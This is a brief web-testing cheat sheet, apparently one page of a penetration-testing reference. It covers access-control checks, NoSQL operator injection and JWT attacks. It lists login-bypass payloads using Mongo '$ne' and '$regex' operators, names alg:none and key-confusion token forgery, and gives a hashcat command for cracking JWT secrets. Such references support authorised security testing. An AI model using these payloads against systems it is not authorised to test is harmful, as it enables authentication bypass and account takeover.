# Web auth, NoSQL, and JWT

[← Foothold quick reference](../02-foothold.md)

## Access control and API input

Change one ID; compare anonymous and two users' read/write results. [GraphQL checks](graphql.md).

## NoSQL operators

If input is Mongo-backed, compare literal values with operators:

```text
{"user":{"$ne":null},"pass":{"$ne":null}}
user[$ne]=x&pass[$ne]=x
user[$regex]=^admin
```

## Server-side templates

[SSTI checks and payloads](ssti.md).

## JWT

Decode header/payload; test whether the server accepts a modified token (`alg:none`, weak HMAC secret, or public-key/HMAC confusion).

```bash
hashcat -m 16500 jwt.txt rockyou.txt
```

Check the installed Hashcat mode. For parser clues, see [deserialization](insecure-deserialization.md).
